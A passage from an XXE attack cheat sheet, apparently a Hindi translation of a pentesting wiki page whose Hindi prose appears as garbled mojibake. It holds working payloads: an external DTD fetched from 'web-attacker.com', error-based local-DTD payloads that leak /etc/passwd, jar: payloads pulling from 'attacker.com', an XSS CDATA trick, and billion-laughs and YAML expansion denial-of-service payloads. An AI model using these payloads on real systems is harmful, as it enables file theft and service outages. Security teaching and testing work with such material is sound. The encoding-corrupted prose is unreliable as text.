3. `eval` рдПрдВрдЯрд┐рдЯреА рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `error` рдПрдВрдЯрд┐рдЯреА рдХреА рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рд╣реЛрддреА рд╣реИред
4. `error` рдПрдВрдЯрд┐рдЯреА рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рд╕реЗ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдлрд╝рд╛рдЗрд▓ рдХреЗ рдирд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд XML рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧреА рдмрд╛рд╣реНрдп DTD рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд (рд╕рд┐рд╕реНрдЯрдо DTD)**

рддреЛ рдмрд╛рд╣рд░реА рдмреИрдВрдб рдЗрдВрдЯрд░реЗрдХреНрд╢рдиреНрд╕ рдмреНрд▓реЙрдХ рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ рдмреНрд▓рд╛рдЗрдВрдб XXE рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛ рд╣реИ (рдмрд╛рд╣рд░реА рдХрдиреЗрдХреНрд╢рди рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИрдВ)?.

XML рднрд╛рд╖рд╛ рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдПрдХ рдЫрд▓ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ DTD рдЖрдВрддрд░рд┐рдХ рдФрд░ рдмрд╛рд╣рд░реА рдШреЛрд╖рдгрд╛рдПрдБ рдорд┐рд▓рд╛рддрд╛ рд╣реИред рдпрд╣ рд╕рдорд╕реНрдпрд╛ рдмрд╛рд╣рд░реА рд░реВрдк рд╕реЗ рдШреЛрд╖рд┐рдд рдПрдВрдЯрд┐рдЯреА рдХреЗ рдЖрдВрддрд░рд┐рдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд XXE рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдРрд╕реЗ рд╣рдорд▓реЗ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреЗ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рдкрд╣рд▓реЗ рд╕реЗ рдмрд╛рд╣рд░реА DTD рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЖрдВрддрд░рд┐рдХ DTD рд╕реЗред рдЬрдм рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдмрд╛рд╣рд░реА рдмреИрдВрдб рдХрдиреЗрдХреНрд╢рди рдмреНрд▓реЙрдХ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп DTD рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рд╣реЛрдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдкрд╛рд░реНрд╢рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рд╣реЛред

рд╕рдордЭреМрддрд╛ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ рд╕рд░реНрд╡рд░ рдХреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ `/usr/local/app/schema.dtd` рдкрд░ рдПрдХ DTD рдлрд╝рд╛рдЗрд▓ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `custom_entity` рдирд╛рдордХ рдПрдХ рдПрдВрдЯрд┐рдЯреА рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рдПрдХ рд╣рд╛рдЗрдмреНрд░рд┐рдб DTD рдкреНрд░рд╕реНрддреБрдд рдХрд░рдХреЗ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ XML рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
рдЗрд╕ DTD рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

- XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдЬрд┐рд╕рдХрд╛ рдирд╛рдо `local_dtd` рд╣реИ, рдЙрд╕рдореЗрдВ рд╕рд░реНрд╡рд░ рдХреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕реНрдерд┐рдд рдмрд╛рд╣реНрдп DTD рдлрд╝рд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рд╣реИред
- `custom_entity` XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреЗ рд▓рд┐рдП рдкреБрдирд░реНрдирд┐рд░реНрдзрд╛рд░рдг рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдкрд╣рд▓реЗ рдмрд╛рд╣реНрдп DTD рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдерд╛, рдПрдХ [рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд XXE рдЙрддреНрдкреАрдбрд╝рди](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) рдХреЛ рдврдХрдиреЗ рдХреЗ рд▓рд┐рдПред рдпрд╣ рдкреБрдирд░реНрдирд┐рд░реНрдзрд╛рд░рдг рдПрдХ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдЙрдЬрд╛рдЧрд░ рд╣реЛрддреА рд╣реИред
- `local_dtd` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдмрд╛рд╣реНрдп DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдирдП рд░реВрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд `custom_entity` рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдЗрди рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдЕрдиреБрдХреНрд░рдо рд╕реЗ, рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рд▓рдХреНрд╖рд┐рдд рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрддреНрд╕рд░реНрдЬрди рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрддреНрдкреАрдбрд╝рди рджреНрд╡рд╛рд░рд╛ рд▓рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

**рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:** GNOME рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░рд┐рд╡реЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдореЗрдВ рдЕрдХреНрд╕рд░ `/usr/share/yelp/dtd/docbookx.dtd` рдкрд░ рдПрдХ DTD рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `ISOamso` рдирд╛рдордХ рдПрдВрдЯрд┐рдЯреА рд╣реЛрддреА рд╣реИред
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

рдЬреИрд╕рд╛ рдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рдПрдХ **рдЖрдВрддрд░рд┐рдХ DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рдПрдХ рдорд╛рдиреНрдп DTD рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред рдЖрдк рдЗрд╕реЗ **рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдХреЗ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рд╡рд╣реА рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо / рд╕реЙрдлреНрдЯрд╡реЗрдпрд░** рдЬреЛ рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ **рдХреБрдЫ рдбрд┐рдлрд╝реЙрд▓реНрдЯ DTDs** рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╛ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреЗ рдЕрдВрджрд░ рд╕реЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ DTDs** рдХреА **рд╕реВрдЪреА рдкрдХрдбрд╝рдиреЗ** рдФрд░ **рдЬрд╛рдВрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рднреА рдореМрдЬреВрджрд╛ рд╣реИ:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind) рджреЗрдЦреЗрдВ

### рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ DTDs рдЦреЛрдЬрдирд╛

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд╛рдирджрд╛рд░ github рд░реЗрдкреЛ рдореЗрдВ рдЖрдк **рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдореМрдЬреВрдж DTDs рдХреЗ рдкрде** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкреАрдбрд╝рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдбреЙрдХрд░ рдЗрдореЗрдЬ** рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реА рд░реЗрдкреЛ рдХреЗ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЗрдореЗрдЬ рдХреЛ рд╕реНрдХреИрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдореМрдЬреВрдж **DTDs** рдХреЗ рдкрде рдХреЛ **рдЦреЛрдЬ** рд╕рдХрддреЗ рд╣реИрдВред [рдЧрд┐рдердм рдХреЗ Readme](https://github.com/GoSecure/dtd-finder) рдХреЛ рдкрдврд╝реЗрдВ рдФрд░ рд╕реАрдЦреЗрдВред
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдСрдлрд┐рд╕ рдУрдкрди XML рдкрд╛рд░реНрд╕рд░реНрд╕

рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рдФрд░ рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП, **[рдЗрд╕ рд╢рд╛рдирджрд╛рд░ рдкреЛрд╕реНрдЯ](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) рдХреЗ рджреВрд╕рд░реЗ рдЦрдВрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**ред

**рдХрдИ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рджреНрд╡рд╛рд░рд╛ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдлрд┐рд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИ, рдЬреЛ рдлрд┐рд░ рдЗрди рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рд╕реЗ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рд╡рд░рдг рдирд┐рдХрд╛рд▓рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХ XLSX рдкреНрд░рд╛рд░реВрдк рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдкрд╛рд░реНрд╕рд░ рдХреЛ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рдЕрд╡рд╢реНрдпрдВрднрд╛рд╡реА рд░реВрдк рд╕реЗ рдХрдо рд╕реЗ рдХрдо рдПрдХ XML рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрд╛рд░реНрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдЗрд╕ рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдорд┐рдХрддрд╛ рдХреА рдЬрд╛рдБрдЪ рдХреЗ рд▓рд┐рдП, рдПрдХ **рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдлрд┐рд╕ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ XXE рдкреЗрд▓реЛрдб рд╣реЛ**ред рдкрд╣рд▓рд╛ рдХрджрдо рдПрдХ рдЦрд╛рд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдмрдирд╛рдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдЕрдирдЬрд╝рд┐рдк рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЬрдм рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдЕрдирдЬрд╝рд┐рдк рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ `./unzipped/word/document.xml` рдкрд░ рд╕реНрдерд┐рдд XML рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ рдкрд╕рдВрджреАрджрд╛ рдкрд╛рда рд╕рдВрдкрд╛рджрдХ (рдЬреИрд╕реЗ vim) рдореЗрдВ рдЦреЛрд▓рдХрд░ рд╕рдВрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред XML рдХреЛ рдЬреАрд╡рдВрд╢ XXE рдкреЗрд▓реЛрдб рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдореЗрдВ рдЕрдХреНрд╕рд░ рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рд╕реЗ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрддрд╛ рд╣реИред

рд╕рдВрд╢реЛрдзрд┐рдд XML рд▓рд╛рдЗрдиреЗрдВ рджреЛ рдореВрд▓ XML рдСрдмреНрдЬ
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIP рдлрд╝рд╛рдЗрд▓реНрд╕ рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдирд╛ **XXE рдХреЛ рд╕рд┐рд╕реНрдЯрдо DTD рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИред** [рдЗрд╕ рдЦрдВрдб рдХреЛ рджреЗрдЦреЗрдВ рдЬрд┐рд╕рдореЗрдВ рд╕рд┐рд╕реНрдЯрдо DTD рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ рдЗрд╕рдХрд╛ рдЬреНрдЮрд╛рди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ](xxe-xee-xml-external-entity.md#error-based-system-dtd)ред
{% endhint %}

PKZIP рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЗ рднреАрддрд░ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рдкреАрдЫреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЬрд╝рд░рд╛ рд╕реЗ рдХрдИ рдХрджрдореЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ:

1. рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реНрдерд╛рди рд╕реЗ рдЬреИрд╕реЗ `https://download.website.com/archive.zip` рд╕реЗ рдЬрд┐рдк рдЖрд░реНрдХрд╛рдЗрд╡ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
2. рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЛ рд╕рдВрдЪрд┐рдд рд░реВрдк рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд╛рдорд╛рдиреНрдпрдд: `/tmp/...` рдЬреИрд╕реА рд╕реНрдерд╛рди рдкрд░ред
3. рдлрд┐рд░ рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЛ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдБрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИред
4. рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЗ рднреАрддрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рд╛рдЗрд▓, `file.zip`, рдкрдврд╝реА рдЬрд╛рддреА рд╣реИред
5. рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдмрдирд╛рдП рдЧрдП рдХрд┐рд╕реА рднреА рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рджреВрд╕рд░реЗ рдХрджрдо рдкрд░ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рд░реНрд╡рд░ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЦреБрд▓рд╛ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд╕реАрдорд┐рдд рд░реВрдк рд╕реЗ рд╕реЗрд╡ рдХрд░рддреЗ рд╕рдордп рд╕рд░реНрд╡рд░ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЦреБрд▓рд╛ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред [рдЗрд╕ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рдЙрдкрд▓рдмреНрдз рдЙрдкрдХрд░рдгреЛрдВ](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ Python рд╕рд░реНрд╡рд░ (`slow_http_server.py`) рдФрд░ рдПрдХ рдЬрд╛рд╡рд╛ рд╕рд░реНрд╡рд░ (`slowserver.jar`) рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдирд╛ рдПрдХ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдкрде рдЪрд▓рдирд╛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ (рдЬреИрд╕реЗ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди, XSLT RCE, рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди, рдЖрджрд┐)ред
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### рдбреАрдУрдПрд╕

#### рдмрд┐рд▓рд┐рдпрди рд╣рдВрд╕реА рд╣рдорд▓рд╛
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml рд╣рдорд▓рд╛
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### рдЪреМрдХрд╕ рдмреНрд▓реЛрдЕрдк рд╣рдорд▓рд╛

![](<../.gitbook/assets/image (531).png>)

#### NTML рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛

